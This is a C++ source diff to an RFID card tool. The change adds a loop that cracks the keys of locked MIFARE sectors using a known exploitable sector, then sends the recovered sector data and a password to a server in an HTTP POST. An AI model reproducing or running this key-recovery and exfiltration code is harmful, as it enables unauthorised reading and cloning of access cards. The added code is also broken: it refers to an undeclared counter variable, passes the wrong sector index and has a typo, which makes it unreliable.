@@ -68,6 +68,8 @@ int main()
 
     MFrec RFID;
 
+    LCD.print( "Ready..", 0, 0 );
+
     RFID.initCom();// blocking
 
 
@@ -77,9 +79,7 @@ int main()
 
     for( int sector = 0; sector<16; sector++)
     {
-	std::cout << "Sector: " << sector << std::endl;
-	LCD.print( "Sector " + std::to_string( sector ), 0, 0 );
-
+	
 	if( !RFID.authenticateOnChip( AUTHENT_A, sector*4 ) )// takes blockAddr, not sector..
 	{
 	    lockedSectors[ nrOfLockedSectors++ ] = sector;
@@ -100,6 +100,27 @@ int main()
 	std::cout << "No sectors use a default key\n";
 	return 0;
     }
+
+    /*-------------------------------------- recover the locked sectors  ---------------------------------------*/
+
+    int nrOfRecoveredKeys = 0;
+    
+    LCD.print( "Recovey", 0, 4 );
+    for( int sector = 0; sector<nrOfLockedSectors; sector++ )
+    {
+	LCD.print( "Sector " + std::to_string(sector), 1, 0 );
+	
+	if( crackKey( AUTHENT_A, exploitSector*4, lockedSectors[sector]*4 ) )
+	{
+	    nrOfRecoveredKeys++;
+	    RFID.initCom();
+	    sendSector( &RFID, sector, &REQ, false );// class has now updated the key
+	}
+    }
+
+    std::cout << "Nr of recovered keys: " << nrOfRecoveredKeys << std::endl;
+    LCD.print( "Keys recovered: ", 0,0 );
+    LCD.print( std::to_string( nrOfKeysRecovered ), 1, 7 );
 
     
 
@@ -171,6 +192,7 @@ void sendSector( MFrec *rfid, int sector, HttpPostMaker *post, bool locked )
 	    post->addToBody( var3 + "=LOCKED" );
 	}
 
+	post->addToBody( var4 + "=" + password );
 	std::cout << post->getPOST() << std::endl;
 	post->send();
     }// for each block
